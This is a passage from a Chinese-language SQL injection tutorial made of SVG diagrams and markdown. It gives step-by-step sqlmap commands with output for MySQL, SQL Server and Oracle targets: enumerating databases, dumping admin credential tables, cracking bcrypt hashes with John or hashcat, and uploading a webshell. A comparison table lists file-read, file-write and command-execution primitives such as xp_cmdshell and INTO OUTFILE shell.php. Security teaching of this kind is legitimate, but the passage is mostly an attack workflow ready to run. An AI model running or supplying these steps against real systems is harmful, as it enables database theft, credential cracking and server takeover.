    <pattern id="s20dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss20g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss20dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-20 MySQL 实战 6 步完整案例：从检测注入到 admin 账号明文密码</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">对应 4.10 节完整命令串=6 条命令连贯执行，20 分钟搞定一个典型业务后台</text>  <rect x="40" y="200" width="165" height="140" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="200" width="165" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="122.5" y="220" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 注入点检测</text>  <text x="122.5" y="250" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u &quot;http://192.168.1.100/news?id=1&quot; --batch --random-agent</text>  <text x="122.5" y="266" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出：the back-end DBMS is MySQL 8.0.35</text>  <rect x="215" y="200" width="165" height="140" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="215" y="200" width="165" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="297.5" y="220" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 列所有数据库</text>  <text x="297.5" y="250" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u ... --batch --dbs</text>  <text x="297.5" y="266" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">[*] information_schema | mysql | performance_schema</text>  <text x="297.5" y="282" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">[*] cisp_news_db  ★ 业务库！</text>  <rect x="390" y="200" width="165" height="140" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="390" y="200" width="165" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="472.5" y="220" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ 列 cisp_news_db 表</text>  <text x="472.5" y="250" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u ... --batch -D cisp_news_db --tables</text>  <text x="472.5" y="266" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">admin_users | articles | category | comments | logs</text>  <text x="472.5" y="282" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">admin_users  ★ 管理员表！</text>  <rect x="565" y="200" width="165" height="140" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="565" y="200" width="165" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="647.5" y="220" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 列 admin_users 字段</text>  <text x="647.5" y="250" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u ... --batch -D cisp_news_db -T admin_users --columns</text>  <text x="647.5" y="266" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">id | username | password | role | email | salt | last_login</text>  <text x="647.5" y="282" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">password+salt=哈希加盐拼接</text>  <rect x="740" y="200" width="165" height="140" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="740" y="200" width="165" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="822.5" y="220" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ dump 管理员表</text>  <text x="822.5" y="250" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u ... --batch -D cisp_news_db -T admin_users -C id,username,role,password --dump</text>  <text x="822.5" y="266" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">[1] admin | 超级管理员 | $2a$10$N9qo... (bcrypt)</text>  <rect x="915" y="200" width="165" height="140" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="915" y="200" width="165" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="997.5" y="220" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 自动 bcrypt 破解</text>  <text x="997.5" y="250" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">→ SQLMap 识别 bcrypt $2a$10$ 自动用 John 跑 wordlist</text>  <text x="997.5" y="266" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">→ 若 John 自带字典不出 → 手动 hashcat -m 3200 hash.txt rockyou.txt</text>  <text x="997.5" y="282" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">→ 结果 admin:Admin@123 登录后台 /upload 传马拿 Shell</text>  <defs><marker id="a205270215270" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="205" y1="270" x2="215" y2="270" stroke="#60a5fa" stroke-width="2" marker-end="url(#a205270215270)"/>  <rect x="191.0" y="258.0" width="38" height="18" rx="6" fill="#020617" stroke="#60a5fa" opacity="0.9"/>  <text x="210.0" y="271.0" text-anchor="middle" font-size="10" font-weight="700" fill="#60a5fa" font-family="Microsoft YaHei,Arial">1→2</text>  <defs><marker id="a380270390270" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="380" y1="270" x2="390" y2="270" stroke="#60a5fa" stroke-width="2" marker-end="url(#a380270390270)"/>  <rect x="366.0" y="258.0" width="38" height="18" rx="6" fill="#020617" stroke="#60a5fa" opacity="0.9"/>  <text x="385.0" y="271.0" text-anchor="middle" font-size="10" font-weight="700" fill="#60a5fa" font-family="Microsoft YaHei,Arial">2→3</text>  <defs><marker id="a555270565270" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="555" y1="270" x2="565" y2="270" stroke="#60a5fa" stroke-width="2" marker-end="url(#a555270565270)"/>  <rect x="541.0" y="258.0" width="38" height="18" rx="6" fill="#020617" stroke="#60a5fa" opacity="0.9"/>  <text x="560.0" y="271.0" text-anchor="middle" font-size="10" font-weight="700" fill="#60a5fa" font-family="Microsoft YaHei,Arial">3→4</text>  <defs><marker id="a730270740270" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="730" y1="270" x2="740" y2="270" stroke="#60a5fa" stroke-width="2" marker-end="url(#a730270740270)"/>  <rect x="716.0" y="258.0" width="38" height="18" rx="6" fill="#020617" stroke="#60a5fa" opacity="0.9"/>  <text x="735.0" y="271.0" text-anchor="middle" font-size="10" font-weight="700" fill="#60a5fa" font-family="Microsoft YaHei,Arial">4→5</text>  <defs><marker id="a905270915270" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="905" y1="270" x2="915" y2="270" stroke="#60a5fa" stroke-width="2" marker-end="url(#a905270915270)"/>  <rect x="891.0" y="258.0" width="38" height="18" rx="6" fill="#020617" stroke="#60a5fa" opacity="0.9"/>  <text x="910.0" y="271.0" text-anchor="middle" font-size="10" font-weight="700" fill="#60a5fa" font-family="Microsoft YaHei,Arial">5→6</text>  <rect x="30" y="370" width="1020" height="118" rx="10" fill="#020617" stroke="#334155"/>  <text x="540" y="392" text-anchor="middle" font-size="13" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">步骤 ⑤ dump 出来的 admin_users 表（真实示例，4 列完整数据）</text>  <rect x="50" y="400" width="50" height="26" fill="#1e293b" stroke="#6366f1"/>  <text x="75.0" y="417" text-anchor="middle" font-size="10.5" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">id</text>  <rect x="100" y="400" width="150" height="26" fill="#1e293b" stroke="#6366f1"/>  <text x="175.0" y="417" text-anchor="middle" font-size="10.5" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">username</text>  <rect x="250" y="400" width="150" height="26" fill="#1e293b" stroke="#6366f1"/>  <text x="325.0" y="417" text-anchor="middle" font-size="10.5" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">role</text>  <rect x="400" y="400" width="630" height="26" fill="#1e293b" stroke="#6366f1"/>  <text x="715.0" y="417" text-anchor="middle" font-size="10.5" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">password (bcrypt $2a$10$)</text>  <rect x="1030" y="400" width="80" height="26" fill="#1e293b" stroke="#6366f1"/>  <text x="1070.0" y="417" text-anchor="middle" font-size="10.5" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">破解结果</text>  <rect x="50" y="426" width="50" height="26" fill="#022c22" stroke="#334155"/>  <text x="75.0" y="443" text-anchor="middle" font-size="10" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">1</text>  <rect x="100" y="426" width="150" height="26" fill="#022c22" stroke="#334155"/>  <text x="175.0" y="443" text-anchor="middle" font-size="10" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">admin</text>  <rect x="250" y="426" width="150" height="26" fill="#022c22" stroke="#334155"/>  <text x="325.0" y="443" text-anchor="middle" font-size="10" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">超级管理员</text>  <rect x="400" y="426" width="630" height="26" fill="#022c22" stroke="#334155"/>  <text x="715.0" y="443" text-anchor="middle" font-size="8.5" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68L</text>  <rect x="1030" y="426" width="80" height="26" fill="#022c22" stroke="#334155"/>  <text x="1070.0" y="443" text-anchor="middle" font-size="10" fill="#f87171" font-family="Consolas,Microsoft YaHei,Arial">Admin@123</text>  <rect x="50" y="452" width="50" height="26" fill="#0b1530" stroke="#334155"/>  <text x="75.0" y="469" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2</text>  <rect x="100" y="452" width="150" height="26" fill="#0b1530" stroke="#334155"/>  <text x="175.0" y="469" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">editor</text>  <rect x="250" y="452" width="150" height="26" fill="#0b1530" stroke="#334155"/>  <text x="325.0" y="469" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">内容编辑</text>  <rect x="400" y="452" width="630" height="26" fill="#0b1530" stroke="#334155"/>  <text x="715.0" y="469" text-anchor="middle" font-size="8.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">$2a$10$4vK1b3J4d....xyz</text>  <rect x="1030" y="452" width="80" height="26" fill="#0b1530" stroke="#334155"/>  <text x="1070.0" y="469" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Edit@2024</text>  <rect x="50" y="478" width="50" height="26" fill="#111c35" stroke="#334155"/>  <text x="75.0" y="495" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3</text>  <rect x="100" y="478" width="150" height="26" fill="#111c35" stroke="#334155"/>  <text x="175.0" y="495" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">auditor</text>  <rect x="250" y="478" width="150" height="26" fill="#111c35" stroke="#334155"/>  <text x="325.0" y="495" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">审计</text>  <rect x="400" y="478" width="630" height="26" fill="#111c35" stroke="#334155"/>  <text x="715.0" y="495" text-anchor="middle" font-size="8.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">$2a$10$7hK2...AbCdEf</text>  <rect x="1030" y="478" width="80" height="26" fill="#111c35" stroke="#334155"/>  <text x="1070.0" y="495" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Audit@1234</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">6 步 6 条命令= 从 0 → 拿到管理员账号密码；流程背下来=任何 MySQL 注入你都能复现</text>
</svg>

### 场景说明

目标：`http://target.example.com/product?id=1`
数据库：MySQL

### 步骤1：检测注入

```bash
sqlmap -u "http://target.example.com/product?id=1" --batch
```

`--batch`自动回答所有问题。

输出确认：
```
[+] GET parameter 'id' appears to be 'AND boolean-based' injectable
[+] back-end DBMS: MySQL
```

### 步骤2：列出数据库

```bash
sqlmap -u "http://target.example.com/product?id=1" --dbs --batch
```

输出：
```
available databases [2]:
[*] information_schema
[*] shop_db
```

### 步骤3：列出表名

```bash
sqlmap -u "http://target.example.com/product?id=1" -D shop_db --tables --batch
```

输出：
```
Database: shop_db
[3 tables]
+----------+
| users    |
| products |
| orders   |
+----------+
```

### 步骤4：列出列名

```bash
sqlmap -u "http://target.example.com/product?id=1" -D shop_db -T users --columns --batch
```

输出：
```
Database: shop_db
Table: users
[4 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| id       | int      |
| username | varchar  |
| password | varchar  |
| email    | varchar  |
+----------+----------+
```

### 步骤5：提取数据

```bash
sqlmap -u "http://target.example.com/product?id=1" -D shop_db -T users --dump --batch
```

输出：
```
Database: shop_db
Table: users
[2 entries]
+----+----------+----------+------------------+
| id | username | password | email            |
+----+----------+----------+------------------+
| 1  | admin    | admin123 | admin@test.com   |
| 2  | user     | pass123  | user@test.com    |
+----+----------+----------+------------------+
```

---

## 4.11 实战案例：SQL Server注入

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 590" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss15" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss15g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s15dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss15g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss15dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-15 MySQL / SQL Server / Oracle / Access 四大数据库差异对比表</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">核心函数不一样，注入 Payload 不一样；SQLMap 自动识别 DBMS 但手动写 Payload 时必备此表</text>  <rect x="30" y="100" width="160" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="110.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">对比维度</text>  <rect x="200" y="100" width="205" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="302.5" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MySQL 5.7/8.0</text>  <rect x="415" y="100" width="210" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="520.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MSSQL / SQL Server 2012+</text>  <rect x="635" y="100" width="215" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="742.5" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">Oracle 11g/12c/19c</text>  <rect x="860" y="100" width="200" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="960.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MS Access (.mdb/.accdb)</text>  <rect x="30" y="136" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="136" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="136" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="136" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="136" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="170.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">基础信息函数</text>  <text x="206" y="158" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">user() / database() / version()</text>  <text x="421" y="158" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">current_user / @@servername / @@ver</text>  <text x="641" y="158" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">USER / (SELECT name FROM v$database</text>  <text x="866" y="158" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">CurrentUser() / 无内置 version</text>  <rect x="30" y="196" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="196" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="196" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="196" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="196" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="230.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">字符串拼接</text>  <text x="206" y="218" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">concat(a,b,c) / group_concat()</text>  <text x="421" y="218" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">a+b (字符串相加) / STRING_AGG</text>  <text x="641" y="218" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">a || b / LISTAGG</text>  <text x="866" y="218" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">a &amp; b (Access 运算符)</text>  <rect x="30" y="256" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="256" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="256" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="256" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="256" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="290.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">时间盲注函数</text>  <text x="206" y="278" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">SLEEP(5) / BENCHMARK(1e7,SHA1('x'))</text>  <text x="421" y="278" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">WAITFOR DELAY '00:00:05'</text>  <text x="641" y="278" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">DBMS_LOCK.SLEEP(5) → 需高权限</text>  <text x="866" y="278" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">无原生 → 用笛卡尔积重查询延时</text>  <rect x="30" y="316" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="316" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="316" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="316" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="316" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="350.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">报错注入函数</text>  <text x="206" y="338" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">extractvalue / updatexml / NAME_CON</text>  <text x="421" y="338" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">convert(int,@@version) / cast...</text>  <text x="641" y="338" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">ctxsys.drithsx.sn / DBMS_XMLGEN</text>  <text x="866" y="338" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">无报错注入 → 只能联合/盲注</text>  <rect x="30" y="376" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="376" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="376" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="376" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="376" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="410.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">文件读写</text>  <text x="206" y="398" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">LOAD_FILE('/etc/passwd')</text>  <text x="206" y="418" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">INTO OUTFILE '/tmp/shell.php'</text>  <text x="421" y="398" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">BULK INSERT / OPENROWSET</text>  <text x="641" y="398" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">UTL_FILE / DBMS_LOB</text>  <text x="866" y="398" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">不支持 原生文件</text>  <rect x="30" y="436" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="436" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="436" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="436" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="436" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="470.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">命令执行</text>  <text x="206" y="458" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">--os-shell → udf.dll/so（需 FILE 权限）</text>  <text x="421" y="458" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">xp_cmdshell / sp_oacreate</text>  <text x="421" y="478" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">（需 SA 或 alter server role）</text>  <text x="641" y="458" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">DBMS_SCHEDULER 计划任务 Java 存储过程</text>  <text x="866" y="458" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">完全不支持 → 只能 猜解 表</text>  <rect x="30" y="496" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="496" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="496" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="496" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="496" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="530.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">系统库/元信息库</text>  <text x="206" y="518" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">information_schema.tables / columns</text>  <text x="421" y="518" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">master..sysdatabases</text>  <text x="421" y="538" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">information_schema.tables</text>  <text x="641" y="518" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">SYS.USER_TABLES / ALL_TAB_COLUMNS</text>  <text x="866" y="518" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">MSysObjects (隐藏系统表，需特殊权限)</text>
</svg>

### 场景说明

目标：`http://target.example.com/news?id=1`
数据库：Microsoft SQL Server

### 检测与利用

```bash
# 检测
sqlmap -u "http://target.example.com/news?id=1" --batch

# 列出数据库
sqlmap -u "http://target.example.com/news?id=1" --dbs --batch

# 提取数据
sqlmap -u "http://target.example.com/news?id=1" -D master --tables --batch
```

### SQL Server特殊操作

**执行SQL命令：**
```bash
sqlmap -u "http://target.example.com/news?id=1" --sql-shell
```

进入SQL Shell交互模式。

---

## 4.12 实战案例：Oracle注入

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 590" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss15" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss15g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s15dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss15g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss15dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-15 MySQL / SQL Server / Oracle / Access 四大数据库差异对比表</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">核心函数不一样，注入 Payload 不一样；SQLMap 自动识别 DBMS 但手动写 Payload 时必备此表</text>  <rect x="30" y="100" width="160" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="110.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">对比维度</text>  <rect x="200" y="100" width="205" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="302.5" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MySQL 5.7/8.0</text>  <rect x="415" y="100" width="210" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="520.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MSSQL / SQL Server 2012+</text>  <rect x="635" y="100" width="215" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="742.5" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">Oracle 11g/12c/19c</text>  <rect x="860" y="100" width="200" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="960.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MS Access (.mdb/.accdb)</text>  <rect x="30" y="136" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="136" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="136" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="136" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="136" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="170.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">基础信息函数</text>  <text x="206" y="158" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">user() / database() / version()</text>  <text x="421" y="158" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">current_user / @@servername / @@ver</text>  <text x="641" y="158" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">USER / (SELECT name FROM v$database</text>  <text x="866" y="158" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">CurrentUser() / 无内置 version</text>  <rect x="30" y="196" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="196" width="205" height="60" fill="#0b1530" 